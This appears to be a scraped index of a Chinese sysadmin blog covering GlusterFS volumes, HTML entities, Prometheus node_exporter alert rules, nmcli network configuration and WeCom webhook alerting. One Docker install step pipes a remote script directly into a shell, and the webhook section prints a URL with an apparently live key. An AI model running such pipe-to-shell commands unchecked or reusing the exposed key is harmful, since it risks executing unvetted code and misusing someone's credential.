server1:/exp1 server2:/exp2 server3:/exp3 server4:/exp4 第七，分布式条带复制卷(三種混合型) 1234567891011121314gluster volume create test-volume stripe 2 replica 2 transport tcp server1:/exp1 server2:/exp2 server3:/exp3 server4:/exp4 server5:/exp5 server6:/exp6 server7:/exp7 server8:/exp8 ========================================= repl-volume 复制Type: ReplicateNumber of Bricks: 1 x 3 = 3Brick1: 192.168.224.11:/opt/gluster/exp4Brick2: 192.168.224.12:/opt/gluster/exp5Brick3: 192.168.224.13:/opt/gluster/exp6 volume create repl-volumereplica 3transport tcp192.168.224.11:/opt/gluster/exp4192.168.224.12:/opt/gluster/exp5192.168.224.13:/opt/gluster/exp6 force /mnt/a2/测试结果：文件内容所有位置都是可见。创建多个文件，所有文件在所有位置都是可见。 test-volume 分布式Type: DistributeNumber of Bricks: 4Brick1: 192.168.224.11:/opt/gluster/exp1 Brick2: 192.168.224.12:/opt/gluster/exp2Brick3: 192.168.224.13:/opt/gluster/exp3 Brick4: 192.168.224.11:/opt/gluster/exp12 gluster volume create test-volume192.168.224.11:/opt/gluster/exp1192.168.224.12:/opt/gluster/exp2192.168.224.13:/opt/gluster/exp3 force /mnt/a1/ 测试结果：创建多个文件，文件在分散在不同位置。文件内容可以看到。 test1-volume 分布式复制 123456789101112Type: Distributed-ReplicateNumber of Bricks: 2 x 3 = 6Brick1: 192.168.224.11:/opt/gluster/exp10 Brick2: 192.168.224.12:/opt/gluster/exp10Brick3: 192.168.224.13:/opt/gluster/exp10 Brick4: 192.168.224.11:/opt/gluster/exp11Brick5: 192.168.224.12:/opt/gluster/exp11 Brick6: 192.168.224.13:/opt/gluster/exp11gluster volume create test1-volume replica 3 transport tcp 192.168.224.11:/opt/gluster/exp10/ 192.168.224.12:/opt/gluster/exp10/ 192.168.224.13:/opt/gluster/exp10/ 192.168.224.11:/opt/gluster/exp11/ 192.168.224.12:/opt/gluster/exp11/ 192.168.224.13:/opt/gluster/exp11/ /mnt/aaa 测试结果：所有文件都是复制3份，存储在6个位置。 dstripe-volume 分布式条带 12345678910Type: Distributed-StripeNumber of Bricks: 2 x 2 = 4Brick1: 192.168.224.11:/opt/gluster/dstripe1Brick2: 192.168.224.11:/opt/gluster/dstripe2Brick3: 192.168.224.12:/opt/gluster/dstripe1Brick4: 192.168.224.12:/opt/gluster/dstripe2Options Reconfigured:/mnt/dstripe-volume/ 测试结果：所有文件以条带方式分布式存储在多个不同位置。因为文件内容太少，无法完全条带化。 =======================================取消存储共享 123456on Server:umount /mnt/a1on Client1:gluster volume stop test-volumegluster volume delete test-volume ==================================== 12345678gluster peer probe IP 添加集群成员gluster peer status。 查看集群状态gluster volume info 查看卷信息gluster volume status 查看卷状态gluster volume add-brick test-volume 192.168.224.11:/opt/gluster/exp12/ force 添加卷gluster volume remove-brick test-volume 192.168.224.11:/opt/gluster/exp12 start 删除卷gluster volume stop test-volume 停止卷gluster volume delete test-volume 删除卷","link":"/2020/08/04/Gluster%E6%B2%A1%E6%9C%89%E6%9D%A1%E5%B8%A6%E5%8D%B7/"},{"title":"HTML常用符号代码","text":"HTML常用符号代码： ´ &amp;acute; © &amp;copy; &gt; &amp;gt; µ &amp;micro; ® &amp;reg; &amp; &amp;amp; ° &amp;deg; ¡ &amp;iexcl; &amp;nbsp; » &amp;raquo; ¦ &amp;brvbar; ÷ &amp;divide; ¿ &amp;iquest; ¬ &amp;not; § &amp;sect; • &amp;bull; ½ &amp;frac12; « &amp;laquo; ¶ &amp;para; ¨ &amp;uml; ¸ &amp;cedil; ¼ &amp;frac14; &lt; &amp;lt; ± &amp;plusmn; × &amp;times; ¢ &amp;cent; ¾ &amp;frac34; ¯ &amp;macr; “ &amp;quot; ™ &amp;trade; € &amp;euro; £ &amp;pound; ¥ &amp;yen; „ &amp;bdquo; … &amp;hellip; · &amp;middot; › &amp;rsaquo; ª &amp;ordf; ˆ &amp;circ; “ &amp;ldquo; — &amp;mdash; ’ &amp;rsquo; º &amp;ordm; † &amp;dagger; ‹ &amp;lsaquo; – &amp;ndash; ‚ &amp;sbquo; ” &amp;rdquo; ‡ &amp;Dagger; ‘ &amp;lsquo; ‰ &amp;permil; ­ &amp;shy; ˜ &amp;tilde; ≈ &amp;asymp; ⁄ &amp;frasl; ← &amp;larr; ∂ &amp;part; ♠ &amp;spades; ∩ &amp;cap; ≥ &amp;ge; ≤ &amp;le; ″ &amp;Prime; ∑ &amp;sum; ♣ &amp;clubs; ↔ &amp;harr; ◊ &amp;loz; ′ &amp;prime; ↑ &amp;uarr; ↓ &amp;darr; ♥ &amp;hearts; − &amp;minus; ∏ &amp;prod; ‍ &amp;zwj; ♦ &amp;diams; ∞ &amp;infin; ≠ &amp;ne; √ &amp;radic; ‌ &amp;zwnj; ≡ &amp;equiv; ∫ &amp;int; ‾ &amp;oline; → &amp;rarr; α &amp;alpha; η &amp;eta; μ &amp;mu; π &amp;pi; θ &amp;theta; β &amp;beta; γ &amp;gamma; ν &amp;nu; ψ &amp;psi; υ &amp;upsilon; χ &amp;chi; ι &amp;iota; ω &amp;omega; ρ &amp;rho; ξ &amp;xi; δ &amp;delta; κ &amp;kappa; ο &amp;omicron; σ &amp;sigma; ζ &amp;zeta; ε &amp;epsilon; λ &amp;lambda; φ &amp;phi; τ &amp;tau; Α &amp;Alpha; Η &amp;Eta; Μ &amp;Mu; Π &amp;Pi; Θ &amp;Theta; Β &amp;Beta; Γ &amp;Gamma; Ν &amp;Nu; Ψ &amp;Psi; Υ &amp;Upsilon; Χ &amp;Chi; Ι &amp;Iota; Ω &amp;Omega; Ρ &amp;Rho; Ξ &amp;Xi; Δ &amp;Delta; Κ &amp;Kappa; Ο &amp;Omicron; Σ &amp;Sigma; Ζ &amp;Zeta; Ε &amp;Epsilon; Λ &amp;Lambda; Φ &amp;Phi; Τ &amp;Tau; ς &amp;sigmaf; HTML常用符号字符： HTML 原代码 显示结果 描述 &amp;lt; &lt; 小于号或显示标记 &amp;gt; &gt; 大于号或显示标记 &amp;amp; &amp; 可用于显示其它特殊字符 &amp;quot; “ 引号 &amp;reg; ® 已注册 &amp;copy; © 版权 &amp;trade; ™ 商标 &amp;ensp; 半个空白位 &amp;emsp; 一个空白位 &amp;nbsp; 不断行的空白","link":"/2020/08/04/HTML%E5%B8%B8%E7%94%A8%E7%AC%A6%E5%8F%B7%E4%BB%A3%E7%A0%81/"},{"title":"linux搭建shadowsocksVPN服务","text":"嗨，请准确无误地输入密码查看哟！ ","link":"/2020/08/04/LINUX%E7%B3%BB%E7%BB%9F%E6%90%AD%E5%BB%BAshadowsocksVPN%E6%9C%8D%E5%8A%A1/"},{"title":"Prometheus监控linux","text":"Linux服务器系统监控一、环境介绍 主机名 ip地址 系统 说明 localhost 192.168.224.11 centos7.8 docker方式安装Prometheus。 server2.com 192.168.224.12 centos7.8 docker方式安装node_exporter对这台服务器进行监控 1、准备环境 主机更名1hostnamectl set-hostname server2.coms 安装docker镜像加速 123456sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'{&quot;registry-mirrors&quot;: [&quot;http://hub-mirr.c.163.com&quot;]}EOF 安装docker 12345export DOWNLOAD_URL=&quot;http://mirrors.163.com/docker-ce&quot; curl -fsSL https://get.docker.com | sh systemctl enable dockersystemctl start docker 检查 12345678docker -vsystemctl status docker安装自动补全插件yum install -y bash-completionsource /usr/share/bash-completion/completions/dockersource /usr/share/bash-completion/bash_completion 安装docker-compose123456curl -L https://get.daocloud.io/docker/compose/releases/download/1.29.2/docker-compose-`uame -s`-`uname -m` &gt; /usr/local/bin/docker-composesudo chmod +x /usr/local/bin/docker-composels -hl /usr/local/bin/docker-compose 查看大小是否下载完整。或者直接yum install -y docker-compose 检查 1docker-compose -v 二、node_exporter1、docker安装node_exporter12mkdir /data/node_exporter -pcd /data/node_exporter 新建docker-compose.yaml文件 12345678910111213141516171819cat &gt; docker-compose.yaml &lt;&lt;&quot;EOF&quot;version: '3.3'services: node_exporter: image: prom/node-exporter:v1.5.0 container_name: node-exporter restart: always volumes: - /etc/localtime:/etc/localtime:ro - /proc:/host/proc:ro - /sys:/host/sys:ro - /:/rootfs:ro command: - '--path.procfs=/host/proc' - '--path.sysfs=/host/sys' - '--collector.filesystem.ignored-mount-points=^/(sys|proc|dev|host|etc|rootfs/var/lib/docker)($$|/)' ports: - '9100:9100'EOF 启动 1docker-compose up -d 检查 1docker ps -a 配置prometheus.yml文件新增以下内容 123- targets: ['192.168.224.12:9100'] labels: instance: server2.com服务器 重新加载 1curl -X POST http://localhost:9090/-/reload 2、常用的监控指标cpu采集1node_cpu_seconds_total 名称 含义 node_load1 一分钟CPU负载 node_load5 5分钟内CPU负载 node_load15 15分钟CPU负载 内存采集/proc/meminfo 文件 node_memory_ 名称 含义 备注 node_memory_MemTotal_bytes 内存总大小 单位字节，/1024/1024=MB, node_memory_MemAvailable_bytes 可空闲使用的内存大小(=free + buffer + cache) /1024/1024/1024=GB node_memory_MemFree_bytes 空闲物理内存大小 node_memory_SwapFree_bytes swap内存空闲大小 node_memory_SwapTotal_bytes swap内存总大小 磁盘采集1node_disk_ 文件系统采集1node_filesystemc_ 名称 含义 node_filesystem_avail_bytes 空闲磁盘大小，单位字节 node_filesystem_size_bytes 磁盘总大小 node_filesystem_files_free 空闲inode大小，单位个 node_filesystem_files inode总大小，单位个 网络采集1node_network_ 名称 含义 node_network_transmit_bytes_total 网络流出流量，单位字节(Byte) node_network_receive_bytes_total 网络流入流量，单位字节(Byte) 3、触发器设置1cd /data/docker-prometheus/ 编写追加内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172cat &gt;&gt; prometheus/alert.yml &lt;&lt;&quot;EOF&quot;- name: node-exporter rules: - alert: HostOutOfMemory expr: node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes * 100 &lt; 10 for: 2m labels: severity: warning annotations: summary: &quot;主机内存不足，实例：{{ $labels.instance}}&quot; description: &quot;内容可用率&lt;10%,当前值：{{ $value}}&quot; - alert: HostMemoryUnderMemoryPressure expr: rate(node_vmstat_pgmajfault[1m]) &gt; 1000 for: 2m labels: severity: warning annotations: summary: &quot;内存压力不足，实例：{{ $labels.instance}}&quot; description: &quot;节点内存压力大。重大页面错误率高，当前值为: {{ $value}}&quot; - alert: HostUnusualNetworkThroughputIn expr: sum by (instance) (rate(node_network_receive_bytes_total[2m])) / 1024 /1024 &gt; 100 for: 5m labels: severity: warning annotations: summary: &quot;异常流入网络吞吐量，实例：{{ $labels.instance}}&quot; description: &quot;网络流入流量 &gt; 100MB/s,当前值：{{ $value}}&quot; - alert: HostUnusualNetworkThroughputOut expr: sum by (instance) (rate(node_network_transmit_bytes_total[2m])) / 1024 / 1024 &gt; 100 for: 5m labels: severity: warning annotations: summary: &quot;异常流出网络吞吐量，实例：{{ $labels.instance}}&quot; description: &quot;网络流出流量 &gt; 100MB/s,当前值：{{ $value}}&quot; - alert: HostUnusualDiskReadRate expr: sum by (instance) (rate(node_disk_read_bytes_total[2m])) / 1024 /1024 &gt; 50 for: 5m labels: severity: warning annotations: summary: &quot;异常磁盘读取，实例：{{ $labels.instance}}&quot; description: &quot;磁盘读取&gt; 50MB/s,当前值: {{ $value}}&quot; - alert: HostunusualDiskWriteRate expr: sum by (instance) (rate(node_disk_written_bytes_total[2m])) / 1024 / 1024 &gt; 50 for: 5m labels: severity: warning annotations: summary: &quot;异常磁盘写入，实例：{{ $labels.instance}}&quot; description: &quot;磁盘写入 &gt; 50MB/s,当前值：{{ $value}}&quot; - alert: HostOutofDiskSpace expr: (node_filesystem_avail_bytes * 100) / node_filesystem_size_bytes &lt; 10 and ON (instance, device,mountpoint) node_filesystem_readonly == 0 for: 2m labels: severity: warning annotations: summary: &quot;磁盘空间不足告警，实例：{{ $labels.instance}}&quot; description: &quot;剩余磁盘空间 &lt; 10%, 当前值：{{ $value}}&quot; - alert: HostDiskWillFillIn24Hours expr: (node_filesystem_avail_bytes * 100 ) / node_filesystem_size_bytes &lt; 10 and ON (instance,device,mountpoint) predict_linear(node_filesystem_avail_bytes{fstype!~&quot;tmpfs&quot;}[1h], 24 * 3600) &lt; 0 and ON (instance,device,mountpoint) node_filesystem_readonly == 0 for: 2m labels: severity: warning annotations: summary: &quot;磁盘空间将在24小时内耗尽，实例： {{ $labels.instance}}&quot; description: &quot;以当前写入速率预计磁盘空间将在24小时耗尽，当前值: {{ $value}}&quot; - alert: HostOutOfInodes expr: node_filesystem_files_free{mountpoint =&quot;/&quot;} / node_filesystem_files{mountpoint = &quot;/&quot;} * 100 &lt; 10 and ON (instance,device,mountpoint) node_filesystem_readonly{mountpoint=&quot;/&quot;} == 0 for: 2m labels: severity: warning annotations: summary: &quot;磁盘Inodes不足，实例:{{ $labels.instance}}&quot; description: &quot;剩余磁盘 indoes &lt; 10%, 当前值: {{ $value}}&quot; - alert: HostUnusualDiskReadLatency expr: rate(node_disk_read_time_seconds_total[1m]) / rate(node_disk_reads_completed_total[1m]) &gt; 0.1 and rate(node_disk_reads_completed_total[1m]) &gt; 0 for: 2m labels: severity: warning annotations: summary: &quot;异常磁盘读取延迟，实例:{{ $labels.instance}}&quot; description: &quot;磁盘读取延迟 &gt; 100ms, 当前值: {{ $value}}&quot; - alert: HostUnusualDiskWriteLatency expr: rate(node_disk_write_time_seconds_total[1m]) / rate(node_disk_writes_completed_total[1m]) &gt; 0.1 and rate(node_disk_writes_completed_total[1m]) &gt; 0 for: 2m labels: severity: warning annotations: summary: &quot;异常磁盘写入延迟，实例:{{ $labels.instance}}&quot; description: &quot;磁盘写入延迟 &gt; 100ms, 当前值: {{ $value}}&quot; - alert: high_load expr: node_load1 &gt; 4 for: 2m labels: severity: page annotations: summary: &quot;CPU1分钟负载过高，实例:{{ $labels.instance}}&quot; description: &quot;CPU1分钟负载 &gt; 4, 当前值: {{ $value}}&quot; - alert: HostCpuIsUnderUtilized expr: 100 - (avg by(instance) (rate(node_cpu_seconds_total{mode=&quot;idle&quot;}[2m])) * 100 ) &gt; 80 for: 1m labels: severity: warning annotations: summary: &quot;CPU负载过高，实例:{{ $labels.instance}}&quot; description: &quot;CPU负载 &gt; 80%, 当前值: {{ $value}}&quot; - alert: HostCpuStealNoisyNeighbor expr: avg by(instance) (rate(node_cpu_seconds_total{mode=&quot;steal&quot;}[5m])) * 100 &gt; 10 for: 0m labels: severity: warning annotations: summary: &quot;CPU窃取率异常，实例:{{ $labels.instance}}&quot; description: &quot;CPU窃取率 &gt; 10%, 嘈杂的邻居正在扼杀 VM 性能，或者 Spot 实例可能失去信用，当前值: {{ $value}}&quot; - alert: HostSwapIsFillingUp expr: (1- (node_memory_SwapFree_bytes / node_memory_SwapTotal_bytes)) * 100 &gt; 80 for: 2m labels: severity: warning annotations: summary: &quot;磁盘swap空间使用率异常，实例:{{ $labels.instance}}&quot; description: &quot;磁盘swap空间使用率 &gt; 80%, 当前值: {{ $value}}&quot; - alert: HostNetworkReceiveErrors expr: rate(node_network_receive_errs_total[2m]) / rate(node_network_receive_packets_total[2m]) &gt; 0.01 for: 2m labels: severity: warning annotations: summary: &quot;异常网络接收错误，实例:{{ $labels.instance}}&quot; description: &quot;网卡{{ $labels.deveice}} 在过去2分钟接收 {{ $value}} 个错误&quot; - alert: HostNetworkTransmitErrors expr: rate(node_network_transmit_errs_total[2m]) / rate(node_network_transmit_packets_total[2m]) &gt; 0.01 for: 2m labels: severity: warning annotations: summary: &quot;异常网络传输错误，实例:{{ $labels.instance}}&quot; description: &quot;网卡{{ $labels.deveice}} 在过去2分钟传输 {{ $value}} 个错误&quot; - alert: HostNetworkInterfaceSaturated expr: (rate(node_network_receive_bytes_total{device!~&quot;^tap.*&quot;}[1m]) + rate(node_network_transmit_bytes_total{device!~&quot;^tap.*&quot;}[1m])) / node_network_speed_bytes{device!~&quot;^tap.*&quot;} &gt; 0.8 &lt; 10000 for: 1m labels: severity: warning annotations: summary: &quot;异常网络接口饱和，实例:{{ $labels.instance}}&quot; description: &quot;网卡{{ $labels.deveice}}正在超载，当前值 {{ $value}}&quot; - alert: HostConnttrackLimit expr: node_nf_conntrack_entries / node_nf_conntrack_entries_limit &gt; 0.8 for: 5m labels: severity: warning annotations: summary: &quot;异常连接数，实例:{{ $labels.instance}}&quot; description: &quot;连接数过大，当前连接数: {{ $value}}&quot; - alert: HostClockSkew expr: (node_timex_offset_seconds &gt; 0.05 and deriv(node_timex_offset_seconds[5m]) &gt;= 0 ) or (node_timex_offset_seconds &lt; -0.05 and deriv(node_timex_offset_seconds[5m]) &lt;= 0) for: 2m labels: severity: warning annotations: summary: &quot;异常时钟偏差，实例:{{ $labels.instance}}&quot; description: &quot;检测到时钟偏差，时钟不同步。值为: {{ $value}}&quot; - alert: HostClockNotSynchronising expr: min_over_time(node_timex_sync_status[1m]) == 0 and node_timex_maxerror_seconds &gt;= 16 for: 2m labels: severity: warning annotations: summary: &quot;时钟不同步，实例:{{ $labels.instance}}&quot; description: &quot;时钟不同步。&quot;EOF 检查下 1vim prometheus/alert.yml 检查配置 1docker exec -it prometheus promtool check config /etc/prometheus/prometheus.yml 重新加载配置 1curl -X POST http://localhost:9090/-/reload 4、grafana展示node_exporter的数据在安装prometheus时，已经在grafana上添加了prometheus数据源，并导入id为1860的模板，就不需要导入了。直接查看就行。","link":"/2023/05/07/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%B3%BB%E7%BB%9F%E7%9B%91%E6%8E%A7/"},{"title":"linux下安装pptpd搭建vpn服务器","text":"嗨，请准确无误地输入密码查看哟！ ","link":"/2020/08/04/Linux%E4%B8%8B%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEpptpd%E6%90%AD%E5%BB%BAvpn%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"title":"Linux安装并使用ssr客户端","text":"嗨，请准确无误地输入密码查看哟！ ","link":"/2022/04/25/Linux%E5%AE%89%E8%A3%85%E5%B9%B6%E4%BD%BF%E7%94%A8ssr%E5%AE%A2%E6%88%B7%E7%AB%AF/"},{"title":"NetworkManager","text":"概述： 本章目标： 使用nmcli和networkmanager管理网络设备 通过编辑配置文件修改网络设置 配置和测试系统主机名和名称解析 网络接口名称： 在redhat7之前网络接口的名称一般为eth0、eth1等等。不过随着设备的增加和删除，这些名称可能会导致一些不对称的信息。 在redhat7中网络设备根据设备类型分配了固定的名称： en o1 6777736 类型 适配器类型 接口编号 接口类型： en开头是以太网接口 w1开头是WLAN接口 ww开头是WWAN接口 适配器类型： o代表板载 s代表可热拔插 p代表PCI接口 NetworkManager 介绍NetworkManager是2004年RedHat启动的项目，皆在能够让Linux用户更轻松的处理现代网络需求，尤其是无线网络，能够自动发现网卡并配置IP地址。 RHEL7上同事支持network.service和NetworkManager.service(简称NM)。默认情况下这2个服务都有开启，但是因为NetworkManager.service当时的兼容性不好，大部分人都会将其关闭。 但是在RHEL 8/Centos 8上已废弃network.service（默认不安装），只能通过NetworkManager进行网络配置。 NetworkManager主要管理2个对象： Connection（网卡连接配置） 和 Device（网卡设备），他们之间是多对一的关系，但是同一时刻只能有一个Connection对于Device才生效。 在RHEL 8/Centos 8有三种方法配置网络： 通过nmcli connection add命令配置，会自动生成ifcfg文件。 手动配置ifcfg文件，通过nmcli connection reload来加载生效。 手动配置ifcfg文件，通过传统network.service来加载生效。 显示IP地址 1234567891011121314ens37: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.2.73 netmask 255.255.255.0 broadcast 192.168.2.255 inet6 fe80::7ea2:3cc1:a899:773c prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:0c:29:75:88:e4 txqueuelen 1000 (Ethernet) RX packets 502 bytes 54467 (53.1 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 29 bytes 4664 (4.5 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0RUNNING： 接口状态，表示可用ether 00:0c:29:75:88:e4 表示MAC地址inet 192.168.2.73 IPV4 地址inet6 fe80::7ea2:3cc1:a899:773c IPV6地址broadcast 192.168.2.255 广播地址 使用nmcli配置网络 network manager是监控和管理网络的服务，命令行工具和图形化工具将配置网络配置信息保存在/etc/sysconfig/network-scripts 目录中。 linux系统的网络配置，可以使用命令行工具、图形化界面工具、配置文件的方式来进行配置，这里推荐使用命令行工具进行配置网络IP地址信息。 nmcli 命令摘要123456789101112nmcli 命令摘要 nmcli dev status 列出物理设备的状态 nmcli dev dis &lt;dev&gt; 关闭物理连接 nmcli dev conn &lt;dev&gt; 打开物理连接 nmcli con show 列出所有连接 nmcli con up &quot;name&quot; 激活连接 nmcli con down &quot;name&quot; 关闭连接 nmcli con add 添加连接 nmcli con mod 修改连接 nmcli con modify &quot;有线连接 1&quot; con-name abc #修改网卡名为abc nmcli con del 删除连接 123456789101112131415nmcli connection 网络连接管理$ nmcli connection show # 查看所有网卡配置$ nmcli connection reload # 重新加载网卡配置，不会立即生效$ nmcli connection down ens37 &amp;&amp; nmcli connection up ens37 # 立即生效Connection配置$ nmcli connection add type ethernet con-name ens37-con ifname ens37 ipv4.addr 1.1.1.2/24 ipv4.gateway 1.1.1.1 ipv4.method manual # 为device创建connection$ nmcli connection add type ethernet con-name ens37-con ifname ens37 ipv4.method auto # dhcp$ nmcli connection modify ens37-con ipv4.addr 1.1.1.3/24 &amp;&amp; nmcli connection up ens37-con # 修改IP地址并立即生效​交互方式修改IP$ nmcli connection edit ens37-con​nmcli device 网卡设备管理$ nmcli device status # 查看所有网卡设备状态$ nmcli device show ens37 # 查看网卡配置$ nmcli device reapply ens37 # 立即生效网卡配置 使用nmcli查看网络信息 123456[root@server ~]# nmcli conn showNAME UUID TYPE DEVICE Wired connection 1 4057b67c-031d-309c-ac43-5e0afaa3c1b8 802-3-ethernet ens37 ens33 17883cd1-86c8-4ec3-b254-5ce6d462e929 802-3-ethernet ens33 virbr0 083789d4-f752-4ba6-aa8a-5d156bef98e8 bridge virbr0 [root@server ~]# 查看单个网卡信息： 1234567891011121314[root@server ~]# nmcli conn show &quot;ens33&quot;connection.id: ens33connection.uuid: 17883cd1-86c8-4ec3-b254-5ce6d462e929connection.stable-id: --connection.interface-name: ens33connection.type: 802-3-ethernetconnection.autoconnect: yesconnection.autoconnect-priority: 0connection.timestamp: 1545900407connection.read-only: noconnection.permissions: connection.zone: --connection.master: --connection.slave-type: -- 查看网卡物理信息 12345678[root@server ~]# nmcli device statusDEVICE TYPE STATE CONNECTION virbr0 bridge connected virbr0 ens33 ethernet connected ens33 ens37 ethernet connected Wired connection 1 lo loopback unmanaged -- virbr0-nic tun unmanaged -- [root@server ~]# nmcli中网卡设备和连接的关系 在redhat7中，我们有网卡设备和网卡连接(connection / profile )，两种东西，他们是什么关系呢？ 网卡设备是我们真实的网卡，而网卡连接是网卡的一个配置文件，我们需要将网卡关联到网卡配置文件上可以正常使用。 使用nmcli命令编辑连接配置修改配置名称，从”Wired connection 1”修改为abc 1234567[root@server ~]# nmcli con modify &quot;Wired connection 1&quot; con-name abc[root@server ~]# nmcli con showNAME UUID TYPE DEVICE abc 4057b67c-031d-309c-ac43-5e0afaa3c1b8 802-3-ethernet ens37 ens33 17883cd1-86c8-4ec3-b254-5ce6d462e929 802-3-ethernet ens33 virbr0 083789d4-f752-4ba6-aa8a-5d156bef98e8 bridge virbr0 [root@server ~]# 关闭自动连接 1nmcli con modify &quot;System eth0&quot; connection.autoconnect no 修改DNS 1nmcli con modify &quot;System eth0&quot; ipv4.dns 223.5.5.5 添加DNS 1nmcli con modify &quot;System eth0&quot; +ipv4.dns 192.168.224.2 修改IP地址 1nmcli con modify &quot;System eth0&quot; ipv4.addresses 192.168.224.10/16 同时修改IP地址和网关 1nmcli conn modify ens33 ipv4.addresses 192.168.224.101/24 ipv4.gateway 192.168.224.2 修改网关 1nmcli conn modify abc ipv4.gateway 192.168.224.2 重新加载配置 12345nmcli con up “System eth0” ，如果无效可以重启network服务。systemctl restart NetworkManager 配置主机名称使用hostname命令显示或临时修改系统的名称。[root@desktop0 ~]# hostname desktop0.example.com[root@desktop0 ~]# hostname XXX.example.comhostname命令实质上读取的/etc/hostname文件，hostname命令修改的主机名称不会保存到该文件当中，只是修改了临时变量，在我们重启系统以后hostname设置的主机名称就会恢复。如需永久修改主机名称，可以使用hostnamectl 命令进行修改。hostnamectl set-hostname XXXXXX如果当系统中没有/etc/hostname的文件，那么系统会使用IP进行DNS的反向解析，从而通过DNS获取主机名称 配置本地名称解析默认情况下，当我们访问一个主机名或一个域名的时候我们需要通过DNS服务器将名称解析成IP地址，但在某些情况下我们可能需要配置一些DNS服务器不存在的名称，那么这个时候我就需要在系统本地设置名称解析。该功能是通过/etc/hosts文件来进行定义的。如有定义/etc/hosts文件，则先按照该文件所定义的内容进行解析，如没有相应的条目则使用DNS服务进行解析。 [root@desktop0 ~]# cat /etc/hosts…172.25.254.254 classroom.example.com172.25.254.254 content.example.com172.25.0.10 desktop0.example.com [root@desktop0 ~]# host classroom.example.comclassroom.example.com has address 172.25.254.254 server 主机名称 hostnameserver.example.com FQDN：(Fully Qualified Domain Name)全限定域名 为Client2增加一块物理桥接类型的网卡，将IP设置为192.168.198.131： 登陆到虚拟机。 运行命令 nmcli conn show。 结果显示只有ens33这一块网卡。 [jim@client1 ~]$ nmcli con show NAME UUID TYPE DEVICE ens33 17883cd1-86c8-4ec3-b254-5ce6d462e929 802-3-ethernet ens33 virbr0 ee3ee66a-b0a2-44e8-8fac-ffefe039a0b1 bridge virbr0 [jim@client1 ~]$ 开机状态下为虚拟机Client2增加一块”仅主机“类型的网卡。 Linux自动识别到新的网卡ens37，连接名称为‘Wired connection 1’。 12345 [root@client4 ~]# nmcli con show NAME UUID TYPE DEVICE Wired connection 1 f7ef9df8-e21a-393c-8b9d-5ac5c300b54b 802-3-ethernet ens37 ens33 17883cd1-86c8-4ec3-b254-5ce6d462e929 802-3-ethernet ens33 virbr0 69cdf8dd-53a3-4db5-9685-6162a828f381 bridge virbr0 运行命令 nmcli conn show。结果显示系统会自动识别到新网卡，并且命令为ens37. 因为网络默认是DHCP类型，所以机器已经自动获得IP地址。 IP网段为192.168.198.X 12345678910111213141516171819[jim@client1 ~]$ ifconfigens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.224.11 netmask 255.255.255.0 broadcast 192.168.224.255 inet6 fe80::aed7:e5a6:39f2:bc3c prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:0c:29:4e:51:b0 txqueuelen 1000 (Ethernet) RX packets 19387 bytes 28578038 (27.2 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 8951 bytes 545551 (532.7 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0ens37: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.198.128 netmask 255.255.255.0 broadcast 192.168.198.255 inet6 fe80::18a7:f3a8:5db7:9e2e prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:0c:29:4e:51:ba txqueuelen 1000 (Ethernet) RX packets 135 bytes 17298 (16.8 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 52 bytes 8999 (8.7 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0。。。 修改IP地址为192.168.198.131。运行: 1nmcli con modify &quot;Wired connection 1&quot; ipv4.addresses &quot;192.168.198.131/24&quot; 激活配置. 1nmcli conn up &quot;Wired connection 1&quot; 运行ifconifg 查询IP，结果显示IP已经生效。 12345678ens37: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.198.131 netmask 255.255.255.0 broadcast 192.168.198.255 inet6 fe80::a660:7d23:dfee:475c prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:0c:29:86:28:31 txqueuelen 1000 (Ethernet) RX packets 5 bytes 1148 (1.1 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 89 bytes 14164 (13.8 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 删除连接配置，将静态IP改为自动获取。 1nmcli conn delete &quot;Wired connection 1&quot; 测试二：为网卡ens37配置多份连接配置。以便于在不同的环境下切换IP配置。 例如配置一中，配置名称conn1 IP设置为192.168.198.120. 配置二中，配置名称conn2，IP设置为192.168.198.121 创建conn1，设置IP为120 1nmcli con add con-name conn1 type ethernet ifname ens37 ipv4.addresses &quot;192.168.198.120/24&quot; ipv4.gateway 192.168.192.1 创建conn2，设置IP为121 1nmcli con add con-name conn2 type ethernet ifname ens37 ipv4.addresses &quot;192.168.198.121/24&quot; ipv4.gateway 192.168.192.1 激活conn2 1nmcli conn up conn2 激活conn1 1nmcli conn up conn1","link":"/2020/08/03/NetworkManager/"},{"title":"Prometheus使用企业微信接收告警通知","text":"一、环境介绍 主机名 IP地址 系统 说明 localhost 192.168.224.11 Centos7.6 docker方式安装的prometheus 二、使用企业微信报警1、注册企业微信浏览器打开https://work.weixin.qq.com/ 点击注册 如下填写资料： 2、webhook告警（和微信应用告警二选一）添加群机器人注册成功后，手机下载企业微信，登陆企业微信。 在手机上，如下图操作： 注：因为我这个是测试企业微信，所以就在”企业全员群“，新建群机器人了。真实一般都是新创建个部门，然后把需要接受报警的人拉到这个部门里面，然后在这个部门群里面新建机器人。 复制机器人的webhook地址我在上图复制的到webhook地址如下： 1https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=6b892c28-c0cf-4962-b45d-3c1f75242O3w 真实只需要用到key后面的 